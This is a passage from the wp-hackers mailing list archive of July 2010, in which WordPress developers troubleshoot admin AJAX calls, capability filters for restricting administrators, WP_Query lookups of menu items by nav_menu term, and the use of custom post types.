> 2.  I'm posting according to the recommended approach and the same way I've
> done before successfully.
>
> 3. Here's the code...
>
> <?php
> add_action('admin_head', 'copyscape_javascript');
>
> function copyscape_javascript() {
> ?>
> <script type="text/javascript" >
> jQuery(document).ready(function($) {
>    $('.checkCopyscape').live('click', function() {
>       var row = $(this).closest("tr");
>
>       var data = {
>          action: 'check_copyscape',
>          rowId: row.attr('id')
>       };
>
>       jQuery.post(ajaxurl, data, function(response) {
>          alert(response);
>          if(response)
>          {
>             row.data('oldHtml', row.html());
>             row.html(response);
>             row.addClass('inline-edit-row');
>          }
>          else
>          {
>
>          }
>       });
>    });
> });
> </script>
> <?php
> }
>
>  add_action('wp_ajax_check_copyscape', 'copyscape_ajax_check');
>
> function copyscape_ajax_check()
> {
>    echo "IN HERE";
>    die();
> }
> ?>
>
> On another plugin I'm working on that works the headers are different...
>
>
>    1. Request URL:
>    http://www.versailles.com/wp-admin/admin-ajax.php
>    2. Request Method:
>    POST
>    3. Status Code:
>    200 OK
>    4. Request Headers
>       1. Accept:
>       */*
>       2. Content-Type:
>       application/x-www-form-urlencoded
>       3. Origin:
>       http://www.versailles.com
>       4. Referer:
>
>       http://www.versailles.com/wp-admin/admin.php?page=textbroker_completed_orders
>       5. User-Agent:
>       Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4
>       (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
>       6. X-Requested-With:
>       XMLHttpRequest
>       5. Form Data
>       1. action:
>       text_broker_view_order
>       2. order_id:
>       580986
>       6. Response Headers
>       1. Cache-Control:
>       no-cache, must-revalidate
>       2. Connection:
>       Keep-Alive
>       3. Content-Type:
>       text/html; charset=UTF-8
>       4. Date:
>       Tue, 27 Jul 2010 15:46:46 GMT
>       5. Expires:
>       Sat, 26 Jul 1997 05:00:00 GMT
>       6. Keep-Alive:
>       timeout=5, max=100
>       7. Server:
>       Apache/2.2.15 (Unix) mod_ssl/2.2.15 OpenSSL/0.9.8m DAV/2
>       mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635
>       8. Transfer-Encoding:
>        chunked
>       9. X-Powered-By:
>       PHP/5.2.13
>
>
>
> On Tue, Jul 27, 2010 at 11:39 AM, Paul <paul at codehooligans.com> wrote:
>
>> Ok. I'll bite. Smells like a support request but here it goes. I just
>> implemented this on a custom plugin. So feeling I might be qualified to
>> answer. But no promises. Some questions.
>>
>> 1. You added the link. Ok, how are you capturing the click event? Assumed
>> some jQuery or whatever. Have you checked to make sure this is getting
>> properly captured and processed?
>>
>> 2. Also, via your client event processing you are calling the method to
>> post to the server something similar to the examples described
>> http://codex.wordpress.org/AJAX_in_Plugins
>>
>> 2b. You mentioned adding debug to admin-ajax.php. Are you using Firefox +
>> Firebug? You should at least be able to see the post of your message to the
>> server. Anything?
>>
>> 3. How about some code to review?
>>
>> P-
>>
>>
>> On Jul 27, 2010, at 11:24 AM, John Gadbois wrote:
>>
>> > I'm attempting to do an AJAX call from wp-admin/edit.php (I added a link
>> > after Quick Edit, through the post_row_actions filter for a plugin).
>>  For
>> > some reason it's not working.  I've verified in Chrome developer tools
>> that
>> > the request is getting sent to the correct URL, but I'm not getting any
>> > response at all from the server.  I even put a debug line and die() at
>> the
>> > top of admin-ajax.php and it didn't return a response.  I've set up AJAX
>> > successfully on other pages specific to my plugin in the admin section.
>> >
>> > I'm posting using ajaxurl, so it isn't a typo or anything like that.
>> >
>> > Any ideas?
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From johnbillion+wp at gmail.com  Tue Jul 27 17:11:21 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Tue, 27 Jul 2010 18:11:21 +0100
Subject: [wp-hackers] API for outputting paginated table in admin section
In-Reply-To: <AANLkTinAybOdx1TQsJ4KeHZRbmE8x6RsRUyYxXakkvTn@mail.gmail.com>
References: <AANLkTinAybOdx1TQsJ4KeHZRbmE8x6RsRUyYxXakkvTn@mail.gmail.com>
Message-ID: <AANLkTikoWcbYdB4dw0GfJ1BVY+ic4y3=fKXWK_6vJP5p@mail.gmail.com>

On Tue, Jul 27, 2010 at 3:21 PM, John Gadbois <jgadbois at gmail.com> wrote:
> Is there a wordpress API (maybe similar to the Settings API) to output a
> paginated table in the Admin section?

I've actually written my own API for this as I found that I was
repeating this code often in my plugins. It's fairly generic. Hands up
if anyone wants it and I'll throw it in a pastebin.

From jgadbois at gmail.com  Tue Jul 27 17:14:13 2010
From: jgadbois at gmail.com (John Gadbois)
Date: Tue, 27 Jul 2010 13:14:13 -0400
Subject: [wp-hackers] API for outputting paginated table in admin section
In-Reply-To: <AANLkTikoWcbYdB4dw0GfJ1BVY+ic4y3=fKXWK_6vJP5p@mail.gmail.com>
References: <AANLkTinAybOdx1TQsJ4KeHZRbmE8x6RsRUyYxXakkvTn@mail.gmail.com> 
	<AANLkTikoWcbYdB4dw0GfJ1BVY+ic4y3=fKXWK_6vJP5p@mail.gmail.com>
Message-ID: <AANLkTi=pK+QbF9Grv-hsRY_vPdz5D5YtDuWMpfCa5vCz@mail.gmail.com>

I'll take it...I'm working on a couple different plugins that could use
it...thanks!

On Tue, Jul 27, 2010 at 1:11 PM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> On Tue, Jul 27, 2010 at 3:21 PM, John Gadbois <jgadbois at gmail.com> wrote:
> > Is there a wordpress API (maybe similar to the Settings API) to output a
> > paginated table in the Admin section?
>
> I've actually written my own API for this as I found that I was
> repeating this code often in my plugins. It's fairly generic. Hands up
> if anyone wants it and I'll throw it in a pastebin.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From deadowlsurvivor at gmail.com  Tue Jul 27 19:40:15 2010
From: deadowlsurvivor at gmail.com (Jacob Beauregard)
Date: Tue, 27 Jul 2010 15:40:15 -0400
Subject: [wp-hackers] Shortcodes
Message-ID: <AANLkTinxq_=POAFDu9LcyO0ey_0uZFUM-Rz0PCXCEp4h@mail.gmail.com>

I wrote my own implementation of shortcodes. It does things a bit
differently, has nested evaluation, and allows self-nesting. Since
there are some significant differences to the existing implementation,
I thought I'd post here to discuss them before trying to convince
anyone to use my implementation. A lot of the changes are borrowed
from definitions in the HTML specification (particularly name and
attribute matching). The following are the comments at the top of my
shortcode file. I tried to keep track of all the differences (and
questions) there. If you reply to this, CC me for a more prompt
response since I'm currently on digest.


From mikeschinkel at newclarity.net  Tue Jul 27 20:29:15 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 27 Jul 2010 15:29:15 -0500 (CDT)
Subject: [wp-hackers] API for outputting paginated table in admin section
In-Reply-To: <AANLkTikoWcbYdB4dw0GfJ1BVY+ic4y3=fKXWK_6vJP5p@mail.gmail.com>
References: <AANLkTinAybOdx1TQsJ4KeHZRbmE8x6RsRUyYxXakkvTn@mail.gmail.com>
	<AANLkTikoWcbYdB4dw0GfJ1BVY+ic4y3=fKXWK_6vJP5p@mail.gmail.com>
Message-ID: <CAC58D08-EF56-4CBC-BF86-6CAE2C0B0D76@newclarity.net>

On Jul 27, 2010, at 1:11 PM, John Blackbourn <johnbillion+wp at gmail.com> wrote:
> I've actually written my own API for this as I found that I was
> repeating this code often in my plugins. It's fairly generic. Hands up
> if anyone wants it and I'll throw it in a pastebin.

From scribu at gmail.com  Tue Jul 27 20:49:33 2010
From: scribu at gmail.com (scribu)
Date: Tue, 27 Jul 2010 23:49:33 +0300
Subject: [wp-hackers] API for outputting paginated table in admin section
In-Reply-To: <CAC58D08-EF56-4CBC-BF86-6CAE2C0B0D76@newclarity.net>
References: <AANLkTinAybOdx1TQsJ4KeHZRbmE8x6RsRUyYxXakkvTn@mail.gmail.com>
	<AANLkTikoWcbYdB4dw0GfJ1BVY+ic4y3=fKXWK_6vJP5p@mail.gmail.com>
	<CAC58D08-EF56-4CBC-BF86-6CAE2C0B0D76@newclarity.net>
Message-ID: <AANLkTinKGb-DvgH2d4lIfRMbQt0wE636p50sIaTIrBBx@mail.gmail.com>

This is something i'm working on as part of my GSoC project:

http://gsoc2010.wordpress.com/silviu-cristian-burca-ajaxify-admin

On 7/27/10, Mike Schinkel <mikeschinkel at newclarity.net> wrote:
> On Jul 27, 2010, at 1:11 PM, John Blackbourn <johnbillion+wp at gmail.com>
> wrote:
>> I've actually written my own API for this as I found that I was
>> repeating this code often in my plugins. It's fairly generic. Hands up
>> if anyone wants it and I'll throw it in a pastebin.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
http://scribu.net

From lox.dev at knc.nc  Tue Jul 27 21:38:32 2010
From: lox.dev at knc.nc (Lox)
Date: Wed, 28 Jul 2010 08:38:32 +1100
Subject: [wp-hackers] Select pages's associated menu items in a specific menu
Message-ID: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com>

Hello,

I try to get a pages's associated menu items in a specific menu, and I
came to this (my menu id is 3) :

$term = get_term(3, 'nav_menu');
	
$query = new WP_Query;
$menu_items = $query->query(
    array(
	    'meta_key' => '_menu_item_object_id',
	    'meta_value' => $object_id,
	    'post_status' => 'any',
	    'post_type' => 'nav_menu_item',
	    'showposts' => -1,
    	    'nav_menu' => $term->slug
    )
);

This doesn't work. So I tried:

$menu_items = $query->query(
    array(
	    'meta_key' => '_menu_item_object_id',
	    'meta_value' => $object_id,
	    'post_status' => 'any',
	    'post_type' => 'nav_menu_item',
	    'showposts' => -1,
    	    'term_id' => 3
    )
);


Doesn't work too.... Any thought ?

-- 
Lox
lox.dev at knc.nc

From rbilesky at gmail.com  Tue Jul 27 22:02:08 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Tue, 27 Jul 2010 15:02:08 -0700
Subject: [wp-hackers] Partial admin capabilities
Message-ID: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>

I want to write a plugin where everytime something that requires the
capability install_plugins (for example) is required it also adds the
condition that the current user's userid is 1.  The purpose of this would be
to restrict certain actions to just me, even though I have other
"administrators" on the blog, I want them to have some of the admin
capabilities but not all,

From otto at ottodestruct.com  Tue Jul 27 22:12:05 2010
From: otto at ottodestruct.com (Otto)
Date: Tue, 27 Jul 2010 17:12:05 -0500
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
Message-ID: <AANLkTinxDavZy8N6cuDu95sgOT2fkBo0ML-qndgB9TAk@mail.gmail.com>

You'll want to look at the "user_has_cap" filter. This is called
whenever the capability check is done for a user.

-Otto



On Tue, Jul 27, 2010 at 5:02 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> I want to write a plugin where everytime something that requires the
> capability install_plugins (for example) is required it also adds the
> condition that the current user's userid is 1. ?The purpose of this would be
> to restrict certain actions to just me, even though I have other
> "administrators" on the blog, I want them to have some of the admin
> capabilities but not all,
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Tue Jul 27 22:12:14 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Tue, 27 Jul 2010 18:12:14 -0400
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
Message-ID: <AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>

On Tue, Jul 27, 2010 at 6:02 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> I want to write a plugin where everytime something that requires the
> capability install_plugins (for example) is required it also adds the
> condition that the current user's userid is 1.  The purpose of this would
> be
> to restrict certain actions to just me, even though I have other
> "administrators" on the blog, I want them to have some of the admin
> capabilities but not all,


It would probably be easier to just leverage the map_meta_cap filter. And
tack on the 'do_not_allow' capability whenever the user isn't you, and it's
a capability you don't want others to have. Check out how map_meta_cap()
works toward the bottom -- core does this exact thing.

From rbilesky at gmail.com  Tue Jul 27 22:40:33 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Tue, 27 Jul 2010 15:40:33 -0700
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>
Message-ID: <AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>

Thanks for the ideas.  I'll try them if I can figure out how, neither is all
that well documented in the codex, just red links to non existant pages.
But i'll see if I can figure it out.

On Tue, Jul 27, 2010 at 3:12 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Tue, Jul 27, 2010 at 6:02 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
>  > I want to write a plugin where everytime something that requires the
> > capability install_plugins (for example) is required it also adds the
> > condition that the current user's userid is 1.  The purpose of this would
> > be
> > to restrict certain actions to just me, even though I have other
> > "administrators" on the blog, I want them to have some of the admin
> > capabilities but not all,
>
>
> It would probably be easier to just leverage the map_meta_cap filter. And
> tack on the 'do_not_allow' capability whenever the user isn't you, and it's
> a capability you don't want others to have. Check out how map_meta_cap()
> works toward the bottom -- core does this exact thing.
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From aaron at jorb.in  Tue Jul 27 22:44:58 2010
From: aaron at jorb.in (Aaron Jorbin)
Date: Tue, 27 Jul 2010 18:44:58 -0400
Subject: [wp-hackers] Partial admin capabilities
In-Reply-To: <AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com> 
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com> 
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>
Message-ID: <AANLkTinTZ+wrE1D5yBwuYJwcQHnfbnvULp738F571oXc@mail.gmail.com>

On Tue, Jul 27, 2010 at 6:40 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> Thanks for the ideas.  I'll try them if I can figure out how, neither is
> all
> that well documented in the codex, just red links to non existant pages.
> But i'll see if I can figure it out.
>

Your best bet is going to be the code for this, not the codex.

http://phpxref.ftwr.co.uk/wordpress/wp-includes/capabilities.php.source.html#l780

http://aaron.jorb.in
twitter: twitter.com/aaronjorbin

From mikeschinkel at newclarity.net  Tue Jul 27 23:31:22 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 27 Jul 2010 19:31:22 -0400
Subject: [wp-hackers] Select pages's associated menu items in a specific
	menu
In-Reply-To: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com>
References: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com>
Message-ID: <DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>

On Jul 27, 2010, at 5:38 PM, Lox wrote:
> I try to get a pages's associated menu items in a specific menu, and I
> came to this (my menu id is 3) :

I've read that sentence 5 times and I still can't figure out exactly what you want the query to include.  Can you please elaborate, maybe with some examples?

-Mike

From lox.dev at knc.nc  Tue Jul 27 23:45:03 2010
From: lox.dev at knc.nc (Lox)
Date: Wed, 28 Jul 2010 10:45:03 +1100
Subject: [wp-hackers] Select pages's associated menu items in a specific
	menu
In-Reply-To: <DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>
References: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com> 
	<DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>
Message-ID: <AANLkTi=i1AC--WpuHWsO95+7PDHAdd7vDZAMgDYCzxDU@mail.gmail.com>

2010/7/28 Mike Schinkel <mikeschinkel at newclarity.net>:
> I've read that sentence 5 times and I still can't figure out exactly what you want the query to include. >?Can you please elaborate, maybe with some examples?

Well I have a menu (ID=3) and I am on a page. My scripts needs to get
all menu items associated with current post in a specific menu
(term_id: 3). The default WP function get associated menu items in ALL
menus.

So basically this retrieve menu items associated with current post in
ANY menu (where object_id is a post ID)

$query = new WP_Query;
$menu_items = $query->query(
   array(
           'meta_key' => '_menu_item_object_id',
           'meta_value' => $object_id,
           'post_status' => 'any',
           'post_type' => 'nav_menu_item',
           'showposts' => -1,
   )
);

To prevent looping through the results to exclude menu item not in
menu id 3, I need to add a parameter to tell WP_QUERY to select only
the menu item of a specific menu (term_id).

I hope it is clear enough. Thkx.

-- 
Lox
lox.dev at knc.nc

From mirepup at gmail.com  Tue Jul 27 23:58:42 2010
From: mirepup at gmail.com (Jeff Rose)
Date: Tue, 27 Jul 2010 16:58:42 -0700
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 107
In-Reply-To: <mailman.12395.1280199980.1338.wp-hackers@lists.automattic.com>
References: <mailman.12395.1280199980.1338.wp-hackers@lists.automattic.com>
Message-ID: <AANLkTikMyu467_Qj1KwLemypWo-7086CjbxgW1_QMj6J@mail.gmail.com>

On Mon, Jul 26, 2010 at 8:06 PM, <wp-hackers-request at lists.automattic.com>wrote:

>
> Today's Topics:
>
>   1. wp_cache function tutorials (Andrew Gray)
>
>
> Here are my slides from my talk at Word Camp RDU about caching and
> Transient API,
>  There are some code samples in there
> http://tayloegray.com/2010/05/slide-from-word-camp-raleigh/
>
> You can download my code samples from the talk here:
> http://dl.dropbox.com/u/896473/cached-sidebar
> .php <http://dl.dropbox.com/u/896473/cached-sidebar%0A.php>
>

Thanks to both Andrew and Otto for their very useful replies.

To the other poster who asked why I don't create a custom post type, it's
because I've got 20,000+ item that aren't considered post-type data in
anyway. Imagine just wanting to let people search your song list in a
widget, vs reading tons of details about it.

If I'm understanding custom post types correctly, it seems a bad way to go
just to store 5 tiny bits of data about 20,000 items.

Anyone?

From mikeschinkel at newclarity.net  Tue Jul 27 23:59:15 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 27 Jul 2010 19:59:15 -0400
Subject: [wp-hackers] Select pages's associated menu items in a specific
	menu
In-Reply-To: <AANLkTi=i1AC--WpuHWsO95+7PDHAdd7vDZAMgDYCzxDU@mail.gmail.com>
References: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com>
	<DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>
	<AANLkTi=i1AC--WpuHWsO95+7PDHAdd7vDZAMgDYCzxDU@mail.gmail.com>
Message-ID: <8F9C55CB-E24F-479F-BB58-BB5ACA8F50AB@newclarity.net>

So do you mean you have menus where a post may be referenced several times, i.e. that you will have multiple menu items that when selected by the user will load the same post?

-Mike

On Jul 27, 2010, at 7:45 PM, Lox wrote:

> 2010/7/28 Mike Schinkel <mikeschinkel at newclarity.net>:
>> I've read that sentence 5 times and I still can't figure out exactly what you want the query to include. > Can you please elaborate, maybe with some examples?
> 
> Well I have a menu (ID=3) and I am on a page. My scripts needs to get
> all menu items associated with current post in a specific menu
> (term_id: 3). The default WP function get associated menu items in ALL
> menus.
> 
> So basically this retrieve menu items associated with current post in
> ANY menu (where object_id is a post ID)
> 
> $query = new WP_Query;
> $menu_items = $query->query(
>   array(
>           'meta_key' => '_menu_item_object_id',
>           'meta_value' => $object_id,
>           'post_status' => 'any',
>           'post_type' => 'nav_menu_item',
>           'showposts' => -1,
>   )
> );
> 
> To prevent looping through the results to exclude menu item not in
> menu id 3, I need to add a parameter to tell WP_QUERY to select only
> the menu item of a specific menu (term_id).
> 
> I hope it is clear enough. Thkx.
> 
> -- 
> Lox
> lox.dev at knc.nc
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Wed Jul 28 00:13:14 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 27 Jul 2010 20:13:14 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 107
In-Reply-To: <AANLkTikMyu467_Qj1KwLemypWo-7086CjbxgW1_QMj6J@mail.gmail.com>
References: <mailman.12395.1280199980.1338.wp-hackers@lists.automattic.com>
	<AANLkTikMyu467_Qj1KwLemypWo-7086CjbxgW1_QMj6J@mail.gmail.com>
Message-ID: <303E689C-F240-43B3-895A-8ABC4805963A@newclarity.net>

On Jul 27, 2010, at 7:58 PM, Jeff Rose wrote:
> To the other poster who asked why I don't create a custom post type, it's
> because I've got 20,000+ item that aren't considered post-type data in
> anyway.
> 
> If I'm understanding custom post types correctly, it seems a bad way to go
> just to store 5 tiny bits of data about 20,000 items.

I think you misunderstand the value of custom post types.  For your use case you'd automatically get the taxonomy system as well as post meta to allow tagging every song with any custom field data you like. You'll also get to serve the song info via a URL like http://example.com/songs/{song-slug}/ where Google will index all 20,000.  You'll also get onsite searching that works with custom post types for "free" too.

Also there are strong indications the WordPress team plans to get rid of the wp_links table in exchange for a 'links' custom post type (as per Nacin recently, and others in the past.)  While not all sites will have 20,000 links, a song might have more related info than a link, so I would ask why they would use post types for links if you wouldn't use post types for songs.

>  Imagine just wanting to let people search your song list in a
> widget, vs reading tons of details about it.

I'm not sure why having a song implemented via a custom post type needs to carry tons of detail about the song in a widget?  You don't have to display everything that's in the database; only display what you need, not everything.  

Anyway, do it how you like but "songs" seem to me to be a perfect fit for a custom post type.

-Mike



From lox.dev at knc.nc  Wed Jul 28 00:14:55 2010
From: lox.dev at knc.nc (Lox)
Date: Wed, 28 Jul 2010 11:14:55 +1100
Subject: [wp-hackers] Select pages's associated menu items in a specific
	menu
In-Reply-To: <8F9C55CB-E24F-479F-BB58-BB5ACA8F50AB@newclarity.net>
References: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com> 
	<DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>
	<AANLkTi=i1AC--WpuHWsO95+7PDHAdd7vDZAMgDYCzxDU@mail.gmail.com> 
	<8F9C55CB-E24F-479F-BB58-BB5ACA8F50AB@newclarity.net>
Message-ID: <AANLkTineqqdhg9B9UKbZakaqQ0TGGpC+CXzGS1NeVxGb@mail.gmail.com>

2010/7/28 Mike Schinkel <mikeschinkel at newclarity.net>:
> So do you mean you have menus where a post may be referenced several times

Sure, but the problem is with posts that may be referenced several
times IN MULTIPLE MENUS.

I basically want to select menu items associated with a specific post
in a specific menu. How do I specify the menu term_id in wp_query?

-- 
Lox
lox.dev at knc.nc

From wp-hackers at striderweb.com  Wed Jul 28 01:31:43 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Tue, 27 Jul 2010 20:31:43 -0500
Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
In-Reply-To: <AANLkTimBXAY9hp6Mv53e794ex6hazK=AVQOi5dsrV8h4@mail.gmail.com>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>
	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com>
	<AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com>
	<AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com>
	<AANLkTikKPeJWW0xX2VweYQ7arMGmn5S2TK-+T9hbAk8V@mail.gmail.com>
	<AANLkTimA2SLcgJNunxbGGr61dPi+mD0uJtwZGJQPHTtd@mail.gmail.com>
	<AANLkTin1Ra1p8Zd4h_18oAVBiQ6JFrjG_rj0YycRwSb1@mail.gmail.com>
	<f84e9e40d475be5a656b967e3cf87b88.squirrel@secure.ftwr.co.uk>
	<AANLkTi=eXEiaSB-pGx8p=CGVQ+66L4q7t+dyhSJd8mOx@mail.gmail.com>
	<AANLkTimBXAY9hp6Mv53e794ex6hazK=AVQOi5dsrV8h4@mail.gmail.com>
Message-ID: <1F0922C6-BCE9-4C55-8691-83E607F813F4@striderweb.com>


On Jul 26, 2010, at 4:39 AM, Carl Roett wrote:

> It's the classic software development scenario ...each user only needs a few
> options, but all of them need *different* options. Somebody using the plugin
> for an application like deviantART <http://www.deviantart.com/> will want
> things configured very differently from a user trying to emulate Facebook,
> or a user trying to emulate LinkedIn. All of these sites have the same group
> of "core" media functions.

Perhaps you could make your plugin support sub-plugins.  Then people could install the Base System, and then a sub-plugin depending on what their situation is -- "facebook", etc.

OR, as somebody else suggested, only save options that are different from default.

Stephen

From mikeschinkel at newclarity.net  Wed Jul 28 02:02:51 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 27 Jul 2010 22:02:51 -0400
Subject: [wp-hackers] Select pages's associated menu items in a specific
	menu
In-Reply-To: <AANLkTineqqdhg9B9UKbZakaqQ0TGGpC+CXzGS1NeVxGb@mail.gmail.com>
References: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com>
	<DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>
	<AANLkTi=i1AC--WpuHWsO95+7PDHAdd7vDZAMgDYCzxDU@mail.gmail.com>
	<8F9C55CB-E24F-479F-BB58-BB5ACA8F50AB@newclarity.net>
	<AANLkTineqqdhg9B9UKbZakaqQ0TGGpC+CXzGS1NeVxGb@mail.gmail.com>
Message-ID: <E54A226D-0B67-4A6A-AEAF-6ABE5C4057EE@newclarity.net>

On Jul 27, 2010, at 8:14 PM, Lox wrote:
> 2010/7/28 Mike Schinkel <mikeschinkel at newclarity.net>:
>> So do you mean you have menus where a post may be referenced several times
> 
> Sure, but the problem is with posts that may be referenced several
> times IN MULTIPLE MENUS.

I just wanted to understand what your requirements were.  (BTW, do you frequently have menu options that point to the same post? Hmm..)

I was struggling with what you wanted and also with the solution for what I think you are looking for so I decided to do it in "my native language" first, which would be SQL. :) 

Can you verify that this gives you the results you are looking for?

http://gist.github.com/493178

Copy the raw file to test.php in the root of your site and call it like this (replacing the URL params with your values of course):

http://example.com/test.php?menu=3&post=2

Let me know if this is ultimately what you want (I know it's better to use the WordPress API, but we'll get there...)

-Mike

 


From mikeschinkel at newclarity.net  Wed Jul 28 02:25:54 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 27 Jul 2010 22:25:54 -0400
Subject: [wp-hackers] Select pages's associated menu items in a specific
	menu
In-Reply-To: <E54A226D-0B67-4A6A-AEAF-6ABE5C4057EE@newclarity.net>
References: <AANLkTim_t8Budmagvo5t2v+jzHUSN+uhkxvPeTMagVGS@mail.gmail.com>
	<DFCEF127-050D-449E-AC1A-1F803E922ED9@newclarity.net>
	<AANLkTi=i1AC--WpuHWsO95+7PDHAdd7vDZAMgDYCzxDU@mail.gmail.com>
	<8F9C55CB-E24F-479F-BB58-BB5ACA8F50AB@newclarity.net>
	<AANLkTineqqdhg9B9UKbZakaqQ0TGGpC+CXzGS1NeVxGb@mail.gmail.com>
	<E54A226D-0B67-4A6A-AEAF-6ABE5C4057EE@newclarity.net>
Message-ID: <CB8F747A-25BD-4640-ADDE-FEEE9F3D8A64@newclarity.net>

Lox,

Assuming I got the previous SQL correct I think this is what you are looking for:

http://gist.github.com/493195

The core of that code is here:

/* --------------------------- */
$post_id = $_GET['post'];
$menu_id = $_GET['menu'];

$term = get_term($menu_id, 'nav_menu');

$menu_items = new WP_Query(
	array(
		'post_type'   => 'nav_menu_item',
		'post_status' => 'any',
		'meta_key'    => '_menu_item_object_id',
		'meta_value'  => $post_id,
		'showposts'   => -1,
		'taxonomy'    => 'nav_menu',
		'term'        => $term->slug,
	)
);
/* --------------------------- */

The key thing to notice is that the menu item post records were related both via post meta (which you figured out) but also via the "nav_menu" taxonomy by term slug (which you hadn't included.)  At first I thought it wasn't going to be possible to do it with WP_Query() but after inspecting the SQL I wrote I realized it was indeed possible, at least what I understood that you needed.

Hope this helps.

-Mike


On Jul 27, 2010, at 10:02 PM, Mike Schinkel wrote:

> On Jul 27, 2010, at 8:14 PM, Lox wrote:
>> 2010/7/28 Mike Schinkel <mikeschinkel at newclarity.net>:
>>> So do you mean you have menus where a post may be referenced several times
>> 
>> Sure, but the problem is with posts that may be referenced several
>> times IN MULTIPLE MENUS.
> 
> I just wanted to understand what your requirements were.  (BTW, do you frequently have menu options that point to the same post? Hmm..)
> 
> I was struggling with what you wanted and also with the solution for what I think you are looking for so I decided to do it in "my native language" first, which would be SQL. :) 
> 
> Can you verify that this gives you the results you are looking for?
> 
> http://gist.github.com/493178
> 
> Copy the raw file to test.php in the root of your site and call it like this (replacing the URL params with your values of course):
> 
> http://example.com/test.php?menu=3&post=2
> 
